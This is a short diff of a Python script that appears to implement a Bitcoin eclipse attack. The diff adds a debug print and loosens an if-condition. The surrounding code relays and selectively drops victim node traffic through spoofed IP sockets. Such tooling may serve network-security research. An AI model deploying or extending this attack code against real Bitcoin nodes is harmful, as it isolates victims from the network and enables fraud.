@@ -190,13 +190,14 @@ def packet_received(packet):
 	# Relay Bitcoin packets that aren't from the victim
 	if packet[IP].src == victim_ip:
 		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')
+		print(msgtype == 'ping')
 		if msgtype == 'ping':
 			msg = from_bytes(bytes(payload))
 			print(msg)
 			print(type(msg))
 			# send pong
 			pass
-	elif packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
+	elif packet[IP].dst == attacker_ip:
 		if len(spoof_IP_sockets) > 0:
 			if random.random() > eclipse_packet_drop_rate:
 				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
